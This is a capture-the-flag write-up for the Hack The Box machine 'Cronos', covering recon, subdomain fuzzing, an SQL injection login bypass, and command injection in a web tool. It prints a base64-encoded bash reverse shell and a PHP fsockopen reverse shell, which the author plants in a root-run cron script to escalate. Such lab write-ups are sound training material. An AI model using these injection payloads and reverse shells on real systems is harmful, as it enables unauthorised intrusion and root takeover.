
# HTB: Cronos
**Platform:** [Hack The Box](https://app.hackthebox.com/machines/Cronos)  
**Difficulty:** `Medium`  
**OS:** `Linux`  
---


## Reconnaissance

Today , we will hack the machine from Hackthebox called cronos. Lets start with some active reconnaissance technique. Every hacker has own method to accomplish this , I have a way of to do it by starting rustscan to identify open ports and the scanning them with nmap for time consuming.

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/CentOs]
└─$ rustscan -a 10.129.227.211 --ulimit 5000 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned ports so fast, even my computer was surprised.

[~] The config file is expected to be at "/home/samurai/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.227.211:22
Open 10.129.227.211:53
Open 10.129.227.211:80
[~] Starting Script(s)
[~] Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-27 22:21 +0400
Initiating Ping Scan at 22:21
Scanning 10.129.227.211 [4 ports]
Completed Ping Scan at 22:21, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:21
Completed Parallel DNS resolution of 1 host. at 22:21, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 22:21
Scanning 10.129.227.211 [3 ports]
Discovered open port 53/tcp on 10.129.227.211
Discovered open port 22/tcp on 10.129.227.211
Discovered open port 80/tcp on 10.129.227.211
Completed SYN Stealth Scan at 22:21, 0.18s elapsed (3 total ports)
Nmap scan report for 10.129.227.211
Host is up, received reset ttl 63 (0.16s latency).
Scanned at 2026-03-27 22:21:13 +04 for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
53/tcp open  domain  syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.00 seconds
           Raw packets sent: 7 (284B) | Rcvd: 4 (172B)

┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/CentOs]
└─$ nmap -A -p22,53,80 10.129.227.211
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-27 22:21 +0400
Nmap scan report for 10.129.227.211
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   160.77 ms 10.10.14.1
2   160.83 ms 10.129.227.211

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.47 seconds
                                                                                                                                     
```


## Enumeration(WEB)

Here we observe that 22,53,80 ports are open. Mostly we will in interact first with http and lets do this. 
After searching manually and fuzzing directories , we found nothing. Then switching to subdomain hunting : 

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/CentOs]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt -H "Host: FUZZ.cronos.htb" -u http://cronos.htb  -fs 11439

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cronos.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt
 :: Header           : Host: FUZZ.cronos.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 11439
________________________________________________

admin                   [Status: 200, Size: 1547, Words: 525, Lines: 57, Duration: 175ms]
[WARN] Caught keyboard interrupt (Ctrl-C)

```

We found admin subdomain and added out /etc/hosts file for DNS resolving. After doing that , we found a login page on admin subdomain and trying some default credentials such as admin:admin,admin:blank , but got nothing.
Next trying some basic SQL Injection payloads (admin'OR 1=1-- -), We successfully authenticate Net Tool application.

In Application , we observed that two commands can be executed on system and also whatever we write after ; mark after IP Address , we got the command output. (Try 8.8.8.8;whoami)

and but when executing 8.8.8.8;bash -i >& /dev/tcp/10.10.14.88:1337 0>&1 command , there is no connection we got. We need to bypass this via popular method. 

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/CentOs]
└─$ echo 'bash -i >& /dev/tcp/[YOUR_IP_ADDRESS]/1337 0>&1' | base64 
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44OC8xMzM3IDA+JjEK
```

In application ->> 8.8.8.8; echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44OC8xMzM3IDA+JjEK' | base64 -d | bash

Replace the base64 encoded value with your own.

and here we go. We got the www-data shell and grabbed user flag.

```bash
www-data@cronos:/var/www/admin$ ls /home
ls /home
noulis
www-data@cronos:/var/www/admin$ ls /home/noulis
ls /home/noulis
user.txt
www-data@cronos:/var/www/admin$ cat /home/noulis/user.txt
cat /home/noulis/user.txt
a705530c54f294b64b32ae51f8f717c7
www-data@cronos:/var/www/admin$ 

```

## Privilege Escalation

Now we need to escalate our privilege to root. After searching some common locations on Linux , look at this delicious thing::

```bash
www-data@cronos:/var/www/laravel$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
#
```

and also we as www-data user have right permission to this php file. Then we need a one-liner php reverse shell to get another reverse shell as root user.

```bash
www-data@cronos:/var/www/laravel$ echo '<?php $sock=fsockopen("10.10.14.88",1338);exec("/bin/sh -i <&3 >&3 2>&3"); ?>' > artisan
);exec("/bin/sh -i <&3 >&3 2>&3"); ?>' > artisan
www-data@cronos:/var/www/laravel$ cat artisan
cat artisan
<?php $sock=fsockopen("10.10.14.88",1338);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
www-data@cronos:/var/www/laravel$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
#
www-data@cronos:/var/www/laravel$ 

```

Because this script runs by root per minute , We waiting it to come back our reverse shell listener

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/CentOs]
└─$ rlwrap nc -lnvp 1338                     
listening on [any] 1338 ...
connect to [10.10.14.88] from (UNKNOWN) [10.129.227.211] 46190
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cd /root
# ls
fix_dns.sh
root.txt
# cat root.txt
1f8e1c29f1d3bb61c7cb9c9675f28607

```

and Boom. Thanks for reading).
